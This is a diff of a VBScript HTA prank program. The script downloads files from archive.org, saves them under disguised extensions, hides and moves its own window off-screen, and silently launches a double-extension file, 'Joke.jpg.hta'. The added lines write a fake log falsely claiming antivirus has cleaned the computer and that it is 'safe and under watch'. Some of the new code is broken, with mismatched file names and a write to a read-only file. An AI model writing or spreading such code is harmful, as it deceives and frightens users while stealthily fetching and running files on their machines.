@@ -29,10 +29,9 @@
     Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
     Set colItems = oWMI.ExecQuery( _
     "SELECT * FROM Win32_NetworkAdapter Where NetEnabled = 'True'")
-    Set bStrm = createobject("Adodb.Stream")
     Set dc = fso.Drives
-    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
-    dim bStrm: Set bStrm = createobject("Adodb.Stream")
+    Set xHttp = createobject("Microsoft.XMLHTTP")
+    Set bStrm = createobject("Adodb.Stream")
     strUser = CreateObject("WScript.Network").UserName
 
     Rem Makes windows uber small and moves it far away
@@ -46,8 +45,9 @@
         .type = 1
         .open
         .write xHttp.responseBody
-        .savetofile WshShell.CurrentDirectory & "\syserror.mp3", 2
+        .savetofile WshShell.CurrentDirectory & "\syserror.jpg", 2
     End With
+    fso.MoveFile "syserror.jpg", "syserror.mp3"
 
     xHttp.Open "GET", "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico", False
     xHttp.Send
@@ -55,12 +55,24 @@
         .type = 1
         .open
         .write xHttp.responseBody
-        .savetofile WshShell.CurrentDirectory & "\sysinstall32.ico", 2
+        .savetofile WshShell.CurrentDirectory & "\sysinstall32.jpg", 2
     End With
+    fso.MoveFile "sysinstall.jpg", "sysinstall.ico"
+    
+    Set objFile = fso.CreateTextFile("syslog.log")
+    objFile.Close
+    Set objFile = Nothing
     
     If fso.FileExists("syserror.mp3") or fso.FileExists("sysinstall32.ico") Then
-    	Return = WshShell.Run("Joke.jpg.hta", 0, false)
-    	window.close
+    	Rem read file
+    	If objFile.Size <= 0 then
+			Set objFile = fso.OpenTextFile("syslog.log")
+			objFile.Write "timestamp 45 valid. antivirus software has cleaned of any threats. computer is safe and under watch."
+			objFile.Close
+			Set objFile = Nothing
+			Return = WshShell.Run("Joke.jpg.hta", 0, false)
+			window.close
+		End If
     End If
     
     Rem Functions and Initialization
@@ -89,7 +101,7 @@
             objFile.Close
             Set objFile = Nothing
             readFile = sData
-	End If
+		End If
     End If
     
     Rem Non obstructing msg boxes
